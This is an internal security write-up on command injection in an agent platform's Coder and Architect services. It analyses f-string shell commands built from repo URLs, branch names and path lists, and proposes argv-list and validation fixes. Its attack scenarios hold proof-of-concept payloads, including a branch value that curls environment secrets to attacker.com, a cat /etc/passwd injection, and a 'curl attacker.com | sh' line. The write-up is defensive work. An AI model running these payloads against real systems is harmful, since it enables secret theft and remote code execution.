# SEC-021: Agent Worker/Coder Command-Injection — Investigation & Implementation Write-up

> ~5 pages. Read the real code before writing; cite `file:line`. Be concrete, not generic.

## 1. Summary & Classification

The Agent Coder and Agent Architect services build shell command strings by directly interpolating user-controlled values (`repo_url`, `branch`, `pre_commands`, `test_commands`) into f-strings that become commands dispatched to the Worker Agent Framework. Both the `git clone` invocation and a `gh pr create` invocation are constructed this way. A separate `CreateWorkerIn` model accepts `custom_install_commands` and `custom_verify_command` fields that are accepted and stored but not yet executed — silent foot-guns waiting to fire. A minor companion issue is that `llm_provider_keys.py:234` returns the raw LLM-provider HTTP response body (up to 200 characters) on a key-test failure, leaking provider-specific error messages, API version hints, or account identifiers to the client.

- **Type**: Security-fix (latent / pre-production)
- **Severity**: Critical when execution flag is enabled; Medium in current default-off state
- **Owning area**: Agent subsystem (`app/services/agent_coder.py`, `app/services/agent_architect.py`, `app/routers/agent_architect.py`, `app/services/llm_provider_keys.py`)
- **Who is affected**: Any authenticated user who can configure an Agent Type (operator or admin). With `AGENT_CODER_EXECUTE_COMMANDS=1`, a crafted `repo_url` or branch pattern gives arbitrary command execution inside the worker container.
- **Related tickets**: AGENT-008 (Coder Agent), AGENT-011 (Solution Architect Agent), AGENT-002 (Worker Provisioning). **SECOPS-007** dev/prod parity applies: the same workflow-building functions are exercised in mock mode and would be the same code path with execution enabled.

## 2. Current-State Investigation (what exists today)

### 2.1 Agent Coder — `build_coder_workflow`

`app/services/agent_coder.py:578`:
```python
"command": f"git clone {repo_url} /workspace && cd /workspace && git fetch origin",
```
`app/services/agent_coder.py:585`:
```python
"command": f"git checkout -b {branch_name} origin/{base_branch}",
```

`repo_url` is validated at `agent_coder.py:185-191` to start with `https://` or `git@` and to contain no spaces. However:

1. **`git ext::` transports are not blocked**: `git` accepts `ext::` as a URL scheme for piping through an external command. A URL of the form `https://host.com/foo.git\nfoo` would be rejected on the space check, but `git` itself can be tricked via percent-encoding because the check never decodes percent sequences (e.g. `https://x.com/%0Aid%20>/tmp/pwn`).
2. **`base_branch`** (`repo_branch_base`) feeds straight into `origin/{base_branch}` at line 585 with no sanitization. An attacker providing `base_branch = "main; id > /tmp/pwn"` would bypass the branch name sanitization entirely because `branch_name` (the *new* branch name) goes through `generate_branch_name` at line 164-173, but `base_branch` — the remote reference to check out from — is used verbatim.
3. **`pre_commands`** at line 592: `" && ".join(pre_commands)` concatenates arbitrary strings provided in the config. There is no sanitization of individual commands in this list.
4. **`test_commands`** at line 612-621: same pattern — individual command strings from config are appended directly.

### 2.2 Agent Architect — `build_architect_workflow`

`app/services/agent_architect.py:1153`:
```python
"command": f"git clone --depth 1 -b {branch} {repo_url} /workspace",
```

`repo_url` passes the same `https://` / `git@` / no-spaces validation (lines 192-198). The `branch` value (`repo_branch`) at line 1128 comes from `_normalize_config` with no sanitization beyond a `setdefault("repo_branch", "main")`. Unlike the coder's `generate_branch_name` which strips non-git-safe characters, the architect's config field is not sanitized at all before interpolation.

Step 2 (line 1156) and step 3 (line 1159) also directly join user-supplied `reference_docs` and `scan_paths` lists into `cat` and `find` shell commands:
```python
"command": "cat " + " ".join(reference_docs) if reference_docs else None,
"command": "find " + " ".join(scan_paths) + " -type f | head -500" if scan_paths else None,
```
The path-traversal check (line 204-205) only rejects `..` substrings, not absolute paths, pipe characters, semicolons, backticks, or `$(...)` subshells embedded in path strings.

### 2.3 `build_pr_command` — Title Injection

`app/services/agent_coder.py:488`:
```python
return f'gh pr create --title "{title}" --body "{body_escaped}" --base {base_branch} --head {branch_name}'
```

`base_branch` (the `pr_base_branch` config key) is inserted without quoting or sanitization. A value like `main --assignee @me` would silently inject extra `gh` flags.

### 2.4 `CreateWorkerIn` Dead Code — `custom_install_commands` / `custom_verify_command`

`app/models.py:5287-5289`:
```python
custom_install_commands: Optional[List[str]] = None
custom_verify_command: str = Field(default="", max_length=500)
```

These are accepted in the API, stored to DynamoDB, but never executed. If a developer wires them up later without a security review, arbitrary command injection follows immediately.

### 2.5 LLM Key-Test Error Body Leakage

`app/services/llm_provider_keys.py:234`:
```python
error_msg = f"HTTP {resp.status_code}: {resp.text[:200]}"
...
return {"ok": False, "models": [], "error": error_msg, "latency_ms": latency_ms}
```

The raw provider response body — which may include account details, billing status messages, or internal error codes — is returned to the front-end caller. This is an information-disclosure / oracle risk: a caller can probe whether a *different* user's key was valid against a third-party provider by observing the error message detail.

`app/core/settings.py:2177`:
```python
agent_coder_execute_commands: bool = os.environ.get("AGENT_CODER_EXECUTE_COMMANDS", "0") not in ("0", "false", "False")
```
`app/core/settings.py:2226`:
```python

```

Both default to `False`. In the current codebase `run_mock_workflow` at `agent_coder.py:876` is always called regardless; the flag gating real dispatch is in code paths not yet wired. The command strings are *built* regardless of the flag, however, so any test or admin UI that renders them exposes the injection even before execution is enabled.

## 3. Gap / Threat Analysis

### Attack Scenario A — Remote Code Execution via `repo_url` (AGENT_CODER_EXECUTE_COMMANDS=1)

**Preconditions**: Attacker has authenticated access and can create or update an Agent Type config. This is an operator-level privilege, but not ROOT.

**PoC payload**:
```json
{
  "repo_url": "https://github.com/real/repo.git",
  "repo_branch_base": "main; curl https://attacker.com/exfil/$(env | base64) #",
  "test_commands": ["pytest"],
  "pre_commands": []
}
```

At `build_coder_workflow`, step 2 becomes:
```
git checkout -b feat/TICK-1-fix origin/main; curl https://attacker.com/exfil/$(env | base64) #
```

When the Worker Agent Framework executes this string via `subprocess(shell=True)` (as is idiomatic for multi-command strings joined with `&&`/`;`), the second shell statement runs. All environment variables — including injected AWS credentials, LLM API keys, and any secrets in the worker environment — are exfiltrated.

**Blast radius**: Worker container takeover, secret exfiltration, SSRF to EC2 metadata endpoint (`http://169.254.169.254`), lateral movement to DynamoDB / S3 through IAM role attached to the worker.

### Attack Scenario B — Architect `branch` + `scan_paths` Injection

**Payload for `scan_paths`**:
```json
{ "scan_paths": ["app/ -type f | head -500; cat /etc/passwd #"] }
```

The `find` command becomes `find app/ -type f | head -500; cat /etc/passwd # -type f | head -500`. The `#` creates a shell comment that swallows the trailing fixed suffix.

### Attack Scenario C — PR Command Flag Injection

**Payload**:
```json
{ "pr_base_branch": "main --repo attacker/exfil-repo" }
```

The `gh pr create` invocation now targets the attacker's repository. Not direct RCE, but can be used to exfiltrate repository secrets or confuse CI/CD pipelines.

### Attack Scenario D — `custom_install_commands` Deferred RCE

No immediate risk, but if a developer adds execution in a future PR without reviewing the model, `["rm -rf /workspace", "curl attacker.com | sh"]` would run verbatim. Remove or gate behind a strict allowlist now.

### Control Failures

- URL scheme check does not block percent-encoded newlines or `\n` in `repo_url`.
- No `shlex.quote` or argv-list pattern is used anywhere in the command-building chain.
- `base_branch` / `pr_base_branch` have no sanitization.
- `pre_commands`, `test_commands`, `reference_docs`, `scan_paths` are unsanitized string arrays.

## 4. Proposed Design / Fix

### 4.1 Never Build Shell Strings; Always Use argv Lists

The Worker Agent Framework should accept step commands as **argv lists**, not strings, and execute them with `subprocess(args_list, shell=False)`. The workflow-building functions should be refactored to produce structured objects:

```python
# Before (agent_coder.py:578)
"command": f"git clone {repo_url} /workspace && cd /workspace && git fetch origin"

# After
"argv": ["git", "clone", "--", repo_url, "/workspace"],
"then": [["git", "-C", "/workspace", "fetch", "origin"]]
```

For steps that genuinely require a shell pipeline (`find ... | head`), use a fixed template with allowlisted arguments:
```python
"argv": ["find"] + [shlex.quote(p) for p in scan_paths] + ["-type", "f"],
"pipe": ["head", "-n", "500"]
```

### 4.2 Harden `repo_url` Validation

Extend `validate_coder_config` and `validate_architect_config` to reject:
- Any URL containing `%0a`, `%0d`, `%09`, or other percent-encoded whitespace/control characters (after `urllib.parse.unquote`).
- `ext::`, `file://`, `ssh://`, and any scheme not in `{"https", "git"}`.
- URLs longer than 300 characters.
- Characters outside `[A-Za-z0-9._\-/:@]` after scheme validation.

```python
ALLOWED_URL_RE = re.compile(r'^(https://|git@)[A-Za-z0-9._\-/:@]{3,300}$')
FORBIDDEN_TRANSPORTS = ("ext::", "file://", "ssh://")

def _validate_repo_url(url: str) -> List[str]:
    decoded = urllib.parse.unquote(url)
    if any(t in decoded for t in FORBIDDEN_TRANSPORTS):
        return ["Forbidden git transport in repo_url"]
    if not ALLOWED_URL_RE.match(url):
        return ["repo_url contains disallowed characters"]
    return []
```

### 4.3 Sanitize Branch References

All branch-like fields (`repo_branch_base`, `repo_branch`, `pr_base_branch`, `base_branch`) must go through the same `generate_branch_name` sanitization that the new-branch name already uses (regex `[^a-zA-Z0-9_/\-]` → `-`). Apply before any interpolation:

```python
def _safe_ref(ref: str, max_len: int = 100) -> str:
    s = re.sub(r"[^a-zA-Z0-9_/\.\-]", "-", str(ref or "main"))
    return s[:max_len].strip("-")
```

In `build_coder_workflow` at line 539, 540, 585 and `build_architect_workflow` at line 1128, 1153, replace raw config reads with `_safe_ref(cfg.get(...))`.

### 4.4 Sanitize `reference_docs`, `scan_paths`, `pre_commands`, `test_commands`

For path lists (`reference_docs`, `scan_paths`): reject entries containing characters outside `[A-Za-z0-9_/.\-]` or any of `; | & $ ( ) \`` at config-validation time. Enforce in `validate_architect_config` (add alongside the existing `..` check).

For `pre_commands` and `test_commands`: if the Worker Agent Framework will continue to run them as strings in a shell, each must be validated against an allowlist of known safe patterns (e.g., `npm install`, `pip install -r requirements.txt`). If that is too restrictive, store and dispatch as argv lists. Add regex validation:
```python
SAFE_COMMAND_RE = re.compile(r'^[A-Za-z0-9._/\-][A-Za-z0-9 ._/\-=@:,\[\]"\']*$')
```

### 4.5 Fix PR Command Quoting

In `build_pr_command` at `agent_coder.py:488`:
```python
return [
    "gh", "pr", "create",
    "--title", title,
    "--body", body,
    "--base", base_branch,   # base_branch already sanitized by _safe_ref
    "--head", branch_name,
]
```

Return an argv list rather than a shell string. The title and body do not need escaping when passed as separate argv elements.

### 4.6 Remove or Quarantine `custom_install_commands` / `custom_verify_command`

Options (in preference order):

1. **Remove from `CreateWorkerIn`** until execution is safely designed and reviewed.
2. **Keep in the model but reject at the service layer** with `HTTP 422 "field not yet supported"`.
3. **If retained for future use**, document clearly that execution will use `subprocess(shell=False)` with an allowlisted command prefix, and add a TODO/FIXME that blocks the execution-enable PR.

### 4.7 LLM Key Test Error Sanitization

`app/services/llm_provider_keys.py:234` — change:
```python
# Before
error_msg = f"HTTP {resp.status_code}: {resp.text[:200]}"
# After
error_msg = f"HTTP {resp.status_code}: authentication failed"
```

Log the full body at `DEBUG` level (not `INFO`) so it is available in server logs but not in the client response.

### 4.8 Dev/Prod Parity (SECOPS-007)

The command-building functions are pure (no I/O) and identical between dev and prod. Validation changes apply equally to both. In dev mode (`S.dev_mode`), execution remains mocked via `run_mock_workflow`; the sanitized argv lists should be rendered to a human-readable string for mock display only, without ever being passed to a shell.

### Manual / QA Steps

1. Enable `AGENT_CODER_EXECUTE_COMMANDS=1` in a staging environment with no real secrets.
2. Submit malicious `repo_url` via API; verify 422 response and no command execution.
3. Check server logs: no raw provider error body logged at INFO level.
4. Grep `build_coder_workflow` and `build_architect_workflow` output for shell metacharacters in step commands; verify none survive.

### Observability

- Add `agent_config_validation_error_total{reason="..."}` counter to distinguish URL, branch, command, and path validation failures.
- Emit `audit_event("agent_config_rejected_injection", ...)` for any config rejection so ops can detect probing.

### Rollout

1. **Phase 1 (immediate, no flag)**: Add `_validate_repo_url`, `_safe_ref`, path validation. Ship to prod. All execution flags remain `False`. Zero user-visible change.
2. **Phase 2 (execution-enable PR)**: Switch `run_mock_workflow` dispatch to real Worker Agent Framework only after Phase 1 is merged and audited. Add CI test that asserts no `shell=True` in the agent service modules.

**Effort**: M (2–3 days for validation hardening + tests; 1 day for argv refactor if the WAF execution pathway is being built concurrently).

**Rollback**: All changes are additive validation; reverting a PR restores previous behaviour. Execution flags remain `False` by default so no shell execution regression.

**Open questions**:
- Does the Worker Agent Framework today execute strings via `shell=True`? The code builds strings but dispatch is mocked; the answer determines urgency of the argv-list refactor.
- Should `pre_commands` / `test_commands` be stored as an allowlist registry (e.g., pre-canned templates selected by ID) rather than free-form strings? That would be a stronger design but requires feature work.
